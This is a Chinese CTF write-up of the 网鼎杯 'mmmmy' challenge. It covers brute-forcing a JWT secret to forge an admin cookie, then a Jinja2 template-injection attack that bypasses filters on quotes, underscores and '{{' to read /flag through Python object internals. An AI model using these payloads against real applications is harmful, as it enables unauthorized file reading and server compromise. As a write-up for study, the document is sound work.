---
title: "网鼎杯第三场 mmmmy writeup"
date: 2018-08-28T16:45:48+08:00
tags: ["writeup", "python", "网鼎杯"]
---

只给了一个登录，任意用户名和密码都可以登录， `admin` 账号会提示 `nononono`

任意账号登录后发现有个留言系统，点击后提示只有 `admin` 用户才可以进行留言 ( 这里一开始还以为是XSS Orz

思考怎么拿到admin这个账号的登录权限，因为没有注册，登录处也没有可攻击的地方，后来查看cookie的时候发现有个 `token` 的键值，又是 JWT，但是这个和 `i_am_admin` 不一样的是没有地方可以得到 `secret`，于是尝试爆破，得到secret为`6a423`

![](/img/wdb-mmmmy-writeup/20180828103015.png)

然后伪造身份成为admin

![](/img/wdb-mmmmy-writeup/20180828103047.png)


点开留言功能后突然就有点懵逼了，这不像是一个正常的留言系统。 但是发现输入的东西都会原原本本地打印在页面上，于是猜测这是一个SSTI

测试后发现过滤了很多东西，比如`'`，`"`，`os`，`_`，`{{` 只要出现了这些关键字，直接就打印None，太狠了

这里过滤了 `{{` ，其实还可以使用 `{%`，比如 `{% if 1 %}1{%endif%}`，会打印1

然后来思考一下需要绕过的地方，首先 `__` 被过滤，我们可以考虑使用 `[]` 结合 `request`来进行绕过，比如 `{% if ()[request.args.a]%}` ，url中 `/bbs?a=__class__`

很快能构造出来一个读取flag的payload，

```python
{% if ()[request.args.a][request.args.b][request.args.c]()[request.args.d](40)(request.args.e).read()[0:1]==chr(102) %}~4uuu~{%endif%}

a=__class__&b=__base__&c=__subclasses___&d=pop&e=/flag
```

很快也能发现GG了，因为报500错误，这里考虑是没有chr这个函数，那么如法炮制获取chr函数

```python
{%set chr=()[request.args.a][request.args.b][request.args.c]()[59][request.args.a1][request.args.a2][request.args.a3].chr %}

a=__class__&b=__base__&c=__subclasses__&d=pop&e=/flag&a1=__init__&a2=__globals__&a3=__builtins__
```

这时就可以开始愉快的盲注了

![](/img/wdb-mmmmy-writeup/20180828120622.png)

---

其实还有一种更简单的方法，不需要盲注，直接明文，使用jinja2里的print

![](/img/wdb-mmmmy-writeup/20180828120411.png)

直接就打印flag了 Orz

![](/img/wdb-mmmmy-writeup/20180828120727.png)